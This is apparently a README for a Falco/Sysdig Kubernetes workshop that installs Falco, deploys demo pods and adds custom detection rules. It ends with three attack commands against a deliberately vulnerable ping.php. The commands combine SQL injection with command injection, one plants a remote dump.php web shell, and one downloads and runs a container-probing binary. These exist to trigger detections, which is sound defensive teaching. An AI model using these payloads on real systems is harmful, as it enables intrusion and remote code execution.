# Sysdig-demo

# You will install Falco using Helm (already installed in the cluster), a package manager for Kubernetes.

helm repo add falcosecurity https://falcosecurity.github.io/charts

helm repo update

kubectl create ns falco

helm install falco -n falco falcosecurity/falco

# You will create three pods (client, mysql, and ping) for this workshop:

kubectl create namespace ping

kubectl create -f mysql-deployment.yaml --namespace=ping

kubectl create -f mysql-service.yaml --namespace=ping

kubectl create -f ping-deployment.yaml --namespace=ping

kubectl create -f ping-service.yaml --namespace=ping

kubectl create -f client-deployment.yaml --namespace=ping

# you will add a few custom rules to Falco

helm upgrade falco falcosecurity/falco -f Unauthorized_process.yaml -n falco

helm upgrade falco falcosecurity/falco -f change_thread_namespace.yaml -n falco

helm upgrade falco falcosecurity/falco -f writing_to_non_allowed_directory.yaml -n falco

# Attack SQL injection:

kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" --form-string "ipaddr=localhost; ps aux" -X POST http://ping/ping.php

# Attack writing file:

kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" --form-string "ipaddr=localhost; curl https://gist.githubusercontent.com/quique/4630ca1bbd9e7c7d44337d7f132aac8b/raw/00d94164db24b9e53007bee419af0201019f63fe/dump.php > /var/www/html/dump.php " -X POST http://ping/ping.php

# Attack change thread namespace:

kubectl exec client -n ping -- curl -F "s=OK" -F "user=bob" -F "passwd=foobar" --form-string "ipaddr=localhost; cd /tmp; curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64; chmod 555 amicontained; ./amicontained" -X POST http://ping/ping.php
